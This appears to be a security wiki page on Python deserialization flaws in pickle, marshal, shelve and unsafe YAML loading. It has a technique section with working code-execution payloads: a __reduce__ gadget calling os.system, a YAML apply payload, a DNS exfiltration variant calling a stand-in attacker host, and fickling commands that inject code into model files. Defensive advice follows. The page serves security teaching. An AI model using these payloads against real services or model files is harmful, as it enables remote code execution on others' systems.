---
title: Python Deserialization Sinks
slug: python-deserialization
---

> **TL;DR:** `pickle`, `marshal`, `shelve`, and `yaml.unsafe_load` all execute arbitrary callables at load time via `__reduce__`, turning any byte stream from an attacker into code execution.

## What it is
Pickle is documented as unsafe but ships in nearly every Python web app: session stores, Celery task payloads, ML model checkpoints, and "fast" caches. The `__reduce__` protocol lets an object declare a callable plus arguments that the unpickler will invoke verbatim. `marshal` and `shelve` share the same risk surface; PyYAML's default loader was unsafe until 5.1.

## Preconditions / where it applies
- `pickle.loads`, `pickle.load`, `cPickle.loads`, `dill.loads`, `joblib.load`, `torch.load(..., weights_only=False)`
- `yaml.load(stream)` without `Loader=SafeLoader` on PyYAML <5.1, or any `yaml.unsafe_load`
- `shelve.open` on attacker-supplied DB files; `marshal.loads` for `.pyc`-style payloads
- Reachability: signed-but-leaked Flask cookies, Celery broker, Redis cache with mixed tenants

## Technique
Build a minimal `__reduce__` gadget, no extra modules required.

```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwn",))

payload = base64.b64encode(pickle.dumps(RCE())).decode()

# YAML equivalent on unsafe_load
yaml_payload = """
!!python/object/apply:os.system ["id"]
"""

# blind variant: no stdout — exfil via DNS
class Blind:
    def __reduce__(self):
        return (eval, ("__import__('socket').gethostbyname('a.attacker.tld')",))

# fickling helps audit and craft
# pip install fickling
# fickling --check suspicious.pkl
# fickling --inject 'print("rce")' model.pkl > evil.pkl
```

For sandboxed unpicklers that override `find_class`, look for any allowed class whose `__init__` writes to disk or whose module exposes `eval` — the find_class allowlist is brittle.

## Detection and defence
- Replace with `json`, `msgpack`, or `ast.literal_eval` for trust-boundary data
- `yaml.safe_load` only; pin PyYAML and add a CI check
- For models, `torch.load(..., weights_only=True)` (Torch 2.4+) and `safetensors` for HF
- Sign payloads (HMAC) at the producer and verify before unpickling; rotate the key
- Audit hook on `pickle.find_class` and alert on unexpected modules
- Static scan with `fickling --check` in CI for any committed `.pkl`

## References
- [pickle — Python docs warning](https://docs.python.org/3/library/pickle.html) — explicit "do not unpickle untrusted data"
- [Fickling — Trail of Bits](https://github.com/trailofbits/fickling) — pickle decompiler and linter

See also: [[python-dangerous-sinks]], [[ruby-deserialization-audit]], [[nodejs-prototype-pollution-audit]].
